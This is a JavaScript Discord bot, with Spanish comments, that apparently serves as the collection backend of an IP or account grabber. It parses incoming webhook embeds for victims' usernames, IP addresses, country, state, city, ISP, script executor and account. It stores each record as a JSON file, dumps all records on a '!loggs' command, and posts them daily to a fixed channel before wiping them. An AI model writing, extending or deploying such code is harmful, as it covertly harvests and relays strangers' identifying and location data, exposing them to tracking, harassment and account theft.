// ===============================
// BOT LOGGER COMPLETO BY CHATGPT
// ===============================
const TOKEN = process.env.TOKEN;
const fs = require("fs");
const path = require("path");
const { Client, GatewayIntentBits } = require("discord.js");

// ===============================
// CONFIG
// ===============================
const LOG_FOLDER = "./logs";
const CHANNEL_ID = "1440773871254110300";

// Crear carpeta si no existe
if (!fs.existsSync(LOG_FOLDER)) fs.mkdirSync(LOG_FOLDER);

// ===============================
// INICIAR BOT
// ===============================
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// ===============================
// GUARDAR LOG EN ARCHIVO
// ===============================
function saveLog(data) {
    const fileName = path.join(LOG_FOLDER, `${Date.now()}.json`);
    fs.writeFileSync(fileName, JSON.stringify(data, null, 2));
}

// ===============================
// LEER TODOS LOS LOGS
// ===============================
function getAllLogs() {
    const files = fs.readdirSync(LOG_FOLDER);
    let logs = [];

    for (const file of files) {
        const raw = fs.readFileSync(path.join(LOG_FOLDER, file));
        logs.push(JSON.parse(raw));
    }

    return logs;
}

// ===============================
// CAPTURA DE MENSAJES (incluye WEBHOOKS)
// ===============================
client.on("messageCreate", message => {

    // Ignorar bots, excepto webhooks
    if (!message.webhookId && message.author.bot) return;

    // Verificar que vengan datos del embed
    const embed = message.embeds[0];
    if (!embed) return;

    // Extraer información del embed
    let data = {
        Nombre: "N/A",
        Display: "N/A",
        IP: "N/A",
        Pais: "N/A",
        Estado: "N/A",
        Ciudad: "N/A",
        ISP: "N/A",
        Executor: "N/A",
        Cuenta: "N/A"
    };

    // Buscar datos dentro de fields
    for (const field of embed.fields) {

        if (field.name.includes("USUARIO")) {
            const texto = field.value;
            data.Nombre = texto.match(/USUARIO:\s(\S+)/)?.[1] || "N/A";
            data.Display = texto.match(/DISPLAY:\s(.+)/)?.[1] || "N/A";
        }

        if (field.name.includes("IP")) {
            data.IP = field.value.replace(/`/g, "");
        }

        if (field.name.includes("UBICACIÓN")) {
            data.Pais = field.value.match(/País:\s```(.+?)```/)?.[1] || "N/A";
            data.Estado = field.value.match(/Estado:\s```(.+?)```/)?.[1] || "N/A";
            data.Ciudad = field.value.match(/Ciudad:\s```(.+?)```/)?.[1] || "N/A";
            data.ISP = field.value.match(/\*\*ISP:\*\*\s(.+)/)?.[1] || "N/A";
        }

        if (field.name.includes("SISTEMA")) {
            data.Executor = field.value.match(/Executor:\s(.+)/)?.[1] || "N/A";
            data.Cuenta = field.value.match(/Cuenta:\s(.+)/)?.[1] || "N/A";
        }
    }

    // Guardar en archivo
    saveLog(data);
});

// ===============================
// COMANDO !loggs → ENVÍA TODOS
// ===============================
client.on("messageCreate", async message => {
    if (message.content === "!loggs") {

        const logs = getAllLogs();

        if (logs.length === 0) {
            return message.reply("⚠️ No hay logs guardados todavía.");
        }

        for (const log of logs) {
            await message.channel.send(
                `${log.Nombre} | ${log.Display} | ${log.IP} | ${log.Pais} | ${log.Estado} | ${log.Ciudad} | ${log.ISP} | ${log.Executor} | ${log.Cuenta}`
            );
        }
    }
});

// ===============================
// ENVÍO AUTOMÁTICO CADA DÍA
// ===============================
setInterval(async () => {

    const channel = client.channels.cache.get(CHANNEL_ID);
    if (!channel) return;

    const logs = getAllLogs();
    if (logs.length === 0) return;

    for (const log of logs) {
        await channel.send(
            `${log.Nombre} | ${log.Display} | ${log.IP} | ${log.Pais} | ${log.Estado} | ${log.Ciudad} | ${log.ISP} | ${log.Executor} | ${log.Cuenta}`
        );
    }

    // limpiar logs después de enviarlos
    fs.rmSync(LOG_FOLDER, { recursive: true, force: true });
    fs.mkdirSync(LOG_FOLDER);

}, 24 * 60 * 60 * 1000); // 1 día

// ===============================
// LOGIN
// ===============================
client.login(TOKEN);
